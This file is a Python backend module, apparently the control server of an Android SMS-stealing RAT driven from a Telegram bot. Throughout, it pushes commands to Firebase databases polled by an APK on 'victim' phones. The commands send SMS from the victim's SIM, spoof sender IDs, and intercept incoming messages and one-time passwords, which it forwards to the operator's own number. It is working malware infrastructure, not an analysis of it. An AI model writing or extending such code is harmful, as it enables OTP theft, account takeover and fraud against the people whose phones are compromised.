import asyncio
import json
import logging
import time
from datetime import datetime, timezone
import httpx

from app.config import get_settings
from app.database import Device, MonitorProfile, OutboundSMS
from app.firebase_client import normalize_firebase_url

logger = logging.getLogger(__name__)
settings = get_settings()

INJECT_TIMEOUT_SEC = 1.5
OUTGOING_TIMEOUT_SEC = 3.0
OUTGOING_SENDER = "__OUT__"

def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    if profile.license_key and profile.license_key.lower().startswith("http"):
        return normalize_firebase_url(profile.license_key)
    return None


def resolve_firebase_url(
    profile: MonitorProfile,
    device: Device | None = None,
) -> str | None:
    """Firebase URL where inject/outbound messages are stored."""
    if device and device.firebase_source_url:
        return normalize_firebase_url(device.firebase_source_url)
    user_url = get_profile_firebase_url(profile)
    if user_url:
        return user_url
    license_key = get_license_key(profile)
    if license_key and license_key.upper().startswith("KEY-"):
        return settings.virtus_module_db.rstrip("/")
    return None


def resolve_apk_poll_id(profile: MonitorProfile, device: Device | None = None) -> str:
    """APK on /mynum phone polls messages/{this_id}."""
    if profile.phone_number:
        return mynum_device_id(profile.phone_number)
    if device:
        return device.name
    return ""


def get_license_key(profile: MonitorProfile) -> str | None:
    if profile.license_key:
        return profile.license_key.strip()
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    return None


_http_client: httpx.AsyncClient | None = None


def _get_http_client() -> httpx.AsyncClient:
    global _http_client
    from app.firebase_client import _httpx_limits

    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=5.0,
            follow_redirects=True,
            limits=_httpx_limits(),
        )
    return _http_client


async def _firebase_put(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT_SEC) -> None:
    client = _get_http_client()
    response = await client.put(f"{url}.json", json=data, timeout=timeout)
    response.raise_for_status()


async def _firebase_put_ok(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT_SEC) -> bool:
    try:
        await _firebase_put(url, data, timeout=timeout)
        return True
    except Exception as exc:
        logger.warning("Firebase put failed for %s: %s", url, exc)
        return False


async def _firebase_put_many(urls: list[str], data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> None:
    if not urls:
        return

    async def _one(url: str) -> None:
        try:
            await _firebase_put(url, data, timeout=timeout)
        except Exception as exc:
            logger.debug("Firebase PUT failed for %s: %s", url, exc)

    await asyncio.gather(*(_one(url) for url in urls), return_exceptions=True)


def _inject_firebase_bases(profile: MonitorProfile, device: Device | None = None) -> list[str]:
    """Firebase roots for inject/outgoing — victim DB first (module DB often deactivated)."""
    bases: list[str] = []
    victim = resolve_firebase_url(profile, device)
    if victim:
        bases.append(normalize_firebase_url(victim))
    module_db = settings.virtus_module_db.rstrip("/")
    if module_db and module_db not in bases:
        bases.append(module_db)
    return bases


def resolve_apk_firebase_url(profile: MonitorProfile, device: Device | None = None) -> str:
    """URL the Virtus APK polls for messages/{device_id}/."""
    victim = resolve_firebase_url(profile, device)
    if victim:
        return normalize_firebase_url(victim)
    return settings.virtus_module_db.rstrip("/")


def _outgoing_command_paths(base: str, device_id: str, command_id: str) -> list[str]:
    paths = [
        f"{base}/commands/{device_id}/{command_id}",
        f"{base}/outgoing/{device_id}/{command_id}",
        f"{base}/clients/{device_id}/commands/{command_id}",
        f"{base}/clients/{device_id}/command/{command_id}",
        f"{base}/clients/{device_id}/outbox/{command_id}",
        f"{base}/clients/{device_id}/send/{command_id}",
        f"{base}/clients/{device_id}/sendSms/{command_id}",
        f"{base}/clients/{device_id}/commandList/{command_id}",
        f"{base}/client/{device_id}/commands/{command_id}",
        f"{base}/devices/{device_id}/commands/{command_id}",
        f"{base}/devices/{device_id}/outbox/{command_id}",
        f"{base}/sms_out/{device_id}/{command_id}",
        f"{base}/sms_commands/{device_id}/{command_id}",
        f"{base}/commandQueue/{device_id}/{command_id}",
        f"{base}/sms/send/{command_id}",
        f"{base}/send/{device_id}/{command_id}",
    ]
    if "/" in device_id:
        leaf = device_id.rsplit("/", 1)[-1]
        paths.extend(
            [
                f"{base}/commands/{leaf}/{command_id}",
                f"{base}/clients/{leaf}/sendSms/{command_id}",
                f"{base}/clients/{leaf}/commands/{command_id}",
            ]
        )
    return paths


def _outgoing_inject_paths(base: str, device_id: str, command_id: str) -> list[str]:
    """Victim SIM send via Virtus/RAT poll on messages/{victim_device_id}/."""
    return [
        f"{base}/messages/{device_id}/{command_id}",
        f"{base}/clients/{device_id}/messages/{command_id}",
        f"{base}/clients/{device_id}/sms_out/{command_id}",
    ]


async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None = None) -> None:
    """Write APK-readable config on victim Firebase (config/{KEY} + virtus_config.json)."""
    firebase_url = resolve_apk_firebase_url(profile, device)
    license_key = get_license_key(profile)
    if not firebase_url or not license_key or not license_key.upper().startswith("KEY-"):
        return

    poll_id = resolve_apk_poll_id(profile, device)
    payload = {
        "monitoring": profile.is_monitoring,
        "ts": int(time.time() * 1000),
        "firebase_url": firebase_url,
        "device_id": poll_id,
        "firebase_key": license_key.strip().upper(),
    }
    base = normalize_firebase_url(firebase_url)
    key = license_key.strip().upper()
    await asyncio.gather(
        _firebase_put_ok(f"{base}/config/{key}", payload),
        _firebase_put_ok(f"{base}/virtus_config.json", payload),
        return_exceptions=True,
    )


async def push_module_config(profile: MonitorProfile, device: Device | None = None) -> None:
    """Push Astik-style APK config to victim + module DB: config/{KEY}."""
    firebase_url = resolve_firebase_url(profile, device)
    if not firebase_url:
        return

    license_key = get_license_key(profile)
    if not license_key or not license_key.upper().startswith("KEY-"):
        return

    from app.license_keys import license_key_exists, push_key_config

    if not license_key_exists(license_key):
        return

    await push_key_config(
        license_key,
        monitoring=profile.is_monitoring,
        device_id=resolve_apk_poll_id(profile, device),
        target_number=profile.phone_number,
        firebase_url=resolve_apk_firebase_url(profile, device),
    )
    await push_virtus_apk_config(profile, device)


def _outgoing_device_ids(device: Device) -> list[str]:
    from app.firebase_client import canonical_device_id

    ids: list[str] = []
    if device.name:
        ids.append(device.name.strip())
        canonical = canonical_device_id(device.name)
        if canonical and canonical not in ids:
            ids.append(canonical)
    if device.firebase_key:
        fk = device.firebase_key.strip("/")
        if fk and fk not in ids:
            ids.append(fk)
        leaf = fk.split("/")[-1]
        if leaf and leaf not in ids:
            ids.append(leaf)
        if fk.startswith("clients/") and leaf not in ids:
            ids.append(leaf)
    return ids or [device.name]


async def push_outgoing_sms_command(
    firebase_url: str,
    device_id: str,
    to_number: str,
    message: str,
    sim_index: int = 0,
    sim_slot: int | None = None,
    spoof_sender: str | None = None,
    *,
    device: Device | None = None,
) -> str | None:
    """Queue channel/outgoing SMS on victim Firebase — panel commands + __OUT__ SIM send."""
    base = normalize_firebase_url(firebase_url)
    command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    slot = sim_slot or (sim_index + 1)
    created_at = datetime.now(timezone.utc).isoformat()
    payload = {
        "to": to_number,
        "phone": to_number,
        "number": to_number,
        "recipient": to_number,
        "message": message,
        "text": message,
        "body": message,
        "msg": message,
        "sim_index": sim_index,
        "sim_slot": slot,
        "sim": slot,
        "simSlot": sim_index,
        "simCard": slot,
        "spoof_sender": spoof_sender,
        "status": "pending",
        "type": "sms",
        "action": "send",
        "command": "send_sms",
        "cmd": "sms",
        "created_at": created_at,
    }
    inject_payload = {
        "sender": OUTGOING_SENDER,
        "body": f"{to_number}\n{message}\n{sim_index}",
        "injected": False,
        "created_at": created_at,
    }

    device_ids = _outgoing_device_ids(device) if device else [device_id]
    if device_id and device_id not in device_ids:
        device_ids.insert(0, device_id)

    command_urls: list[str] = []
    inject_urls: list[str] = []
    for dev_id in device_ids:
        command_urls.extend(_outgoing_command_paths(base, dev_id, command_id))
        inject_urls.extend(_outgoing_inject_paths(base, dev_id, command_id))

    await asyncio.gather(
        _firebase_put_many(command_urls, payload),
        _firebase_put_many(inject_urls, inject_payload),
        return_exceptions=True,
    )
    logger.info(
        "Outgoing queued command_id=%s victim_ids=%s to=%s",
        command_id,
        device_ids,
        to_number,
    )
    return command_id


async def push_inject_message(
    firebase_url: str,
    device_id: str,
    sender: str,
    body: str,
) -> str:
    """Queue SMS inject: {firebase}/messages/{device_id}/{id}."""
    from app.channel_relay import prepare_sms_forward

    if sender != "__OUT__":
        sender, body = prepare_sms_forward(sender, body)
    base = normalize_firebase_url(firebase_url)
    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "sender": sender,
        "body": body,
        "injected": False,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/messages/{device_id}/{message_id}", payload)
    return message_id


async def register_device_on_firebase(
    firebase_url: str,
    device: Device,
    profile: MonitorProfile,
) -> None:
    base = normalize_firebase_url(firebase_url)
    meta = {}
    if device.device_meta:
        try:
            meta = json.loads(device.device_meta)
        except json.JSONDecodeError:
            meta = {}

    payload = {
        "name": device.name,
        "phone": device.phone_number,
        "battery": meta.get("battery") or meta.get("battery_level"),
        "online": True,
        "sim_index": profile.selected_sim_index or 0,
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/devices/{device.name}", payload)


async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
    if not resolve_firebase_url(profile, device):
        return
    try:
        await push_module_config(profile, device)
        if device:
            firebase_url = resolve_firebase_url(profile, device)
            if firebase_url:
                await register_device_on_firebase(firebase_url, device, profile)
                base = normalize_firebase_url(firebase_url)
                await _firebase_put(
                    f"{base}/devices/{device.name}/monitoring",
                    {
                        "active": profile.is_monitoring,
                        "sim_index": profile.selected_sim_index or 0,
                        "ts": int(time.time() * 1000),
                    },
                )
    except Exception as exc:
        logger.warning("Firebase profile sync failed: %s", exc)


def mynum_device_id(phone_number: str) -> str:
    """Virtus APK device id for /mynum phone (see set_user_phone)."""
    from app.services import normalize_phone

    return f"num-{normalize_phone(phone_number)}"


async def push_mynum_inject(
    profile: MonitorProfile,
    device: Device,
    sender: str,
    body: str,
) -> str | None:
    """Astik-style inject: messages/num-{mynum}/ on victim + module Firebase."""
    poll_id = resolve_apk_poll_id(profile, device)
    if not poll_id or not profile.phone_number:
        return None
    from app.channel_relay import prepare_sms_forward

    if sender != "__OUT__":
        sender, body = prepare_sms_forward(sender, body)
    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "sender": sender,
        "body": body,
        "injected": False,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    tasks = []
    for firebase_url in _inject_firebase_bases(profile, device):
        base = normalize_firebase_url(firebase_url)
        tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    if any(result is True for result in results):
        logger.info(
            "Inject queued poll_id=%s bases=%s",
            poll_id,
            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
        )
        return message_id
    logger.error(
        "Inject push failed poll_id=%s bases=%s",
        poll_id,
        _inject_firebase_bases(profile, device),
    )
    return None


async def push_outbound_to_firebase(
    profile: MonitorProfile,
    device: Device,
    outbound: OutboundSMS,
) -> str | None:
    """Forward incoming OTP to /mynum inject path; real SMS via commands/ on device."""
    firebase_url = resolve_firebase_url(profile, device)
    if not firebase_url:
        return None

    try:
        if outbound.spoof_sender and profile.phone_number:
            return await push_mynum_inject(
                profile,
                device,
                outbound.spoof_sender,
                outbound.message,
            )
        return await push_outgoing_sms_command(
            firebase_url,
            device.name,
            outbound.to_number,
            outbound.message,
            sim_index=outbound.sim_index,
            sim_slot=outbound.sim_slot,
            device=device,
        )
    except Exception as exc:
        logger.warning("Firebase outbound push failed: %s", exc)
        return None


async def send_polling_startup_test(
    db,
    profile: MonitorProfile,
    device: Device,
) -> tuple[int, int]:
    """Monitoring start — ASTIK inject to /mynum (APK on mynum). Bot-only users skip inject."""
    import time

    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER

    if not profile.phone_number or not profile.is_monitoring:
        return 0, 0

    license_key = get_license_key(profile)
    if not license_key or not license_key.upper().startswith("KEY-"):
        logger.info("Startup inject skipped: no KEY (bot Firebase poll still active)")
        return 0, 0

    firebase_url = resolve_firebase_url(profile, device)
    if not firebase_url:
        logger.warning("Startup test skipped: no firebase URL")
        return 0, 0

    t0 = time.perf_counter()
    try:
        message_id = await push_mynum_inject(
            profile,
            device,
            STARTUP_TEST_SENDER,
            STARTUP_TEST_MESSAGE,
        )
        if not message_id:
            raise RuntimeError("startup inject push failed")
        total_ms = max(1, int((time.perf_counter() - t0) * 1000))
        logger.info("Startup ASTIK inject queued for /mynum id=%s", message_id)
        return 1, total_ms
    except Exception as exc:
        logger.warning("Startup test inject failed: %s", exc)
        return 0, max(1, int((time.perf_counter() - t0) * 1000))


async def forward_incoming_to_mynum(
    db,
    profile: MonitorProfile,
    device: Device,
    sender: str,
    message: str,
) -> None:
    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (requires KEY + APK)."""
    from app.channel_relay import prepare_sms_forward, queue_forward_to_mynum

    if not profile.phone_number or not profile.is_monitoring:
        return

    license_key = get_license_key(profile)
    if not license_key or not license_key.upper().startswith("KEY-"):
        return

    try:
        sender, message = prepare_sms_forward(sender, message)
        await push_mynum_inject(profile, device, sender, message)
        if db is not None:
            queue_forward_to_mynum(db, profile, device, sender, message)
    except Exception as exc:
        logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)


async def sync_profile_for_user(telegram_user_id: int) -> None:
    """Background-safe Firebase sync using a fresh DB session."""
    from app.database import SessionLocal
    from app.services import get_active_device, get_monitor_profile

    db = SessionLocal()
    try:
        profile = get_monitor_profile(db, telegram_user_id)
        device = get_active_device(db, telegram_user_id)
        if profile:
            await sync_profile_to_firebase(profile, device)
    except Exception as exc:
        logger.warning("Background profile sync failed for %s: %s", telegram_user_id, exc)
    finally:
        db.close()
